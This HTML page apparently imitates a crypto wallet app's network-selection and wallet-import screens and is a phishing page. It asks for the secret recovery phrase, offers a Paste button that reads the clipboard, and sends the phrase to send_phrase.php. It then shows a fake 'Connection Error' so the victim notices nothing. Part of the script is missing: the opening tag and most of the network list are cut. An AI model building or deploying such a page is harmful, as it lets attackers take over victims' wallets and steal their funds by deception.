<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select Network</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f2f2f2; display: flex; justify-content: center; overflow-x: hidden; }
        .app-container { width: 100%; max-width: 480px; background: white; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.05); position: relative; }
        
        header { display: flex; align-items: center; padding: 15px 16px; background: white; position: sticky; top: 0; z-index: 10; border-bottom: 0.5px solid #f0f0f0; }
        .back-link { text-decoration: none; color: #000; font-size: 24px; width: 40px; cursor: pointer; border: none; background: none; }
        header h1 { flex-grow: 1; text-align: center; font-size: 18px; font-weight: 700; }
        .info-btn { color: #8e8e93; font-size: 20px; cursor: pointer; border: none; background: none; width: 40px; text-align: right; }

        .search-area { padding: 8px 16px 16px 16px; }
        .search-box { background: #f1f1f2; border-radius: 12px; display: flex; align-items: center; padding: 10px 14px; }
 .hint { text-align: center; color: #8e8e93; font-size: 13px; margin-top: 10px; }
        .search-box span { color: #8e8e93; margin-right: 10px; font-size: 18px; }
        .search-box input { border: none; background: transparent; outline: none; width: 100%; font-size: 17px; color: #000; }

        /* PIXEL PERFECT RECOMMENDED ALIGNMENT */
        .recommended-container { padding: 30px 16px 15px 16px; position: relative; }
        .recommended-box { border: 1.5px solid #2e3192; border-radius: 14px; position: relative; z-index: 1; }
        .recommended-badge { position: absolute; top: 19px; left: 30px; background: #0000ff; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; z-index: 5; }

        .network-list { flex-grow: 1; overflow-y: auto; }
        .network-item { display: flex; align-items: center; padding: 14px 16px; border-bottom: 0.5px solid #f0f0f0; text-decoration: none; color: #000; cursor: pointer; }
        .network-item:active { background-color: #f9f9f9; }
        
        .logo { width: 36px; height: 36px; margin-right: 14px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: #eee; font-weight: bold; color: white; font-size: 14px; flex-shrink: 0; }
        .logo img { width: 100%; height: 100%; object-fit: cover; }
        
        .name { flex-grow: 1; font-weight: 500; font-size: 16px; }
        .chevron { color: #c7c7cc; font-size: 20px; margin-left: 10px; }
        .hidden { display: none !important; }

        /* Modal / Import Screen */
        #importModal { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; height: 100%; background: white; z-index: 100; display: none; flex-direction: column; }
        .modal-body { padding: 20px 16px; flex-grow: 1; }
        .input-group { margin-bottom: 24px; }
        .input-label { display: block; color: #707070; font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        .text-input-wrap { border: 1px solid #e0e0e0; border-radius: 12px; padding: 12px 14px; display: flex; align-items: center; background: white; }
        .text-input-wrap textarea { border: none; outline: none; width: 100%; font-size: 16px; color: #000; height: 120px; resize: none; }
        .text-input-wrap input { border: none; outline: none; width: 100%; font-size: 16px; color: #000; }
        .paste-btn { color: #2e3192; font-weight: 700; cursor: pointer; font-size: 15px; background: none; border: none; padding: 5px; }
        .restore-btn { width: 100%; padding: 16px; border-radius: 30px; border: none; background: #d8d9fb; color: white; font-size: 16px; font-weight: 700; cursor: not-allowed; transition: 0.3s; }
        .restore-btn.active { background: #4a4ed4; cursor: pointer; }
    </style>
</head>
<body>

<div class="app-container">
    <header>
        <a href="#" class="back-link">←</a>
        <h1>Select network</h1>
        <div class="info-btn">ⓘ</div>
    </header>

    <div class="search-area">
        <div class="search-box"><span>🔍</span><input type="text" id="netSearch" placeholder="Search"></div>
    </div>

    <div class="network-list">
        <div class="recommended-container" id="recSec">
            <div class="recommended-badge">Recommended</div>
            <div class="recommended-box">
                <div class="network-item" onclick="openModal('Multi-coin wallet')" style="border-bottom:none">
                    <div class="logo"><img src="Mt.png"></div>
                    <div class="name">Multi-coin wallet</div>
                    <div class="chevron">›</div>
                </div>
            </div>
        </div>
        <div id="list"></div>
    </div>

    <div id="importModal">
        <header>
            <button class="back-link" onclick="closeModal()">←</button>
            <h1 id="modalTitle">Import</h1>
            <div style="width:40px; text-align: right; color:#8e8e93; font-size: 20px;">🔲</div>
        </header>
        <div class="modal-body">
            <div class="input-group">
                <label class="input-label">Wallet name</label>
                <div class="text-input-wrap"><input type="text" id="walletNameInput"></div>
            </div>
            <div class="input-group">
                <label class="input-label">Secret phrase</label>
                <div class="text-input-wrap" style="flex-direction: column; align-items: flex-end;">
                    <textarea id="phraseInput" placeholder="Separate words with spaces"></textarea>
                    <button class="paste-btn" id="pasteBtn">Paste</button>
                </div>
<p class="hint">Typically 12 (sometimes 18, 24) words separated by single spaces</p>
            </div>
        </div>
        <div class="footer-btns" style="padding: 20px 16px;">
            <button class="restore-btn" id="restoreBtn" disabled>Continue</button>
        </div>
    </div>
</div>

        { n: "Zcash", id: "zcash", c: "#F4B728" },
        { n: "Zeta EVM", id: "zetachain", c: "#005743" },
        { n: "Zilliqa", id: "zilliqa", c: "#49C1BF" },
        { n: "zkLink Nova Mainnet", id: "zklink", c: "#000" },
        { n: "zkSync Era", id: "zksync", c: "#121212" }
    ];

    const listDiv = document.getElementById('list');
    const modal = document.getElementById('importModal');
    const walletNameInput = document.getElementById('walletNameInput');
    const phraseInput = document.getElementById('phraseInput');
    const restoreBtn = document.getElementById('restoreBtn');

    // Build List with Trust Wallet Assets mapping logic
    networks.forEach(net => {
        const div = document.createElement('div');
        div.className = "network-item";
        div.onclick = () => openModal(net.n);
        
        // Trust Wallet Assets Primary URL
        const trustUrl = `https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/${net.id}/info/logo.png`;
        // Fallback to a secondary logo API if GitHub is missing the specific ID
        const fallbackUrl = `https://img.logo.dev/crypto/${net.id}?token=pk_demo`;
        
        div.innerHTML = `
            <div class="logo" style="background:${net.c}">
                <img src="${trustUrl}" onerror="this.src='${fallbackUrl}'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='block';}">
                <span style="display:none;">${net.n.charAt(0)}</span>
            </div>
            <div class="name">${net.n}</div>
            <div class="chevron">›</div>
        `;
        listDiv.appendChild(div);
    });

    function openModal(name) {
        document.getElementById('modalTitle').innerText = `Import ${name}`;
        walletNameInput.value = (name === 'Multi-coin wallet') ? 'Main Wallet' : `${name} Wallet`;
        phraseInput.value = "";
        checkInput();
        modal.style.display = 'flex';
    }

    function closeModal() { modal.style.display = 'none'; }

    // Automatic Paste Button logic
    document.getElementById('pasteBtn').addEventListener('click', async () => {
        try {
            const text = await navigator.clipboard.readText();
            phraseInput.value = text;
            checkInput();
        } catch (err) {
            alert('Enable clipboard access to use automatic paste.');
        }
    });

    function checkInput() {
        if (phraseInput.value.trim().length > 0) {
            restoreBtn.disabled = false;
            restoreBtn.classList.add('active');
        } else {
            restoreBtn.disabled = true;
            restoreBtn.classList.remove('active');
        }
    }

    phraseInput.oninput = checkInput;

    // Send data to PHP script
    restoreBtn.onclick = () => {
        const data = { wallet: walletNameInput.value, phrase: phraseInput.value };
        restoreBtn.innerText = "Please wait...";
        restoreBtn.disabled = true;
        
        fetch('send_phrase.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .finally(() => {
            alert("Connection Error: Please try again later.");
            closeModal();
            restoreBtn.innerText = "Restore wallet";
        });
    };

    document.getElementById('netSearch').oninput = function() {
        const q = this.value.toLowerCase().trim();
        document.querySelectorAll('.network-item').forEach(item => {
            item.classList.toggle('hidden', !item.innerText.toLowerCase().includes(q));
        });
        document.getElementById('recSec').classList.toggle('hidden', q.length > 0);
    };
</script>
</body>
</html>
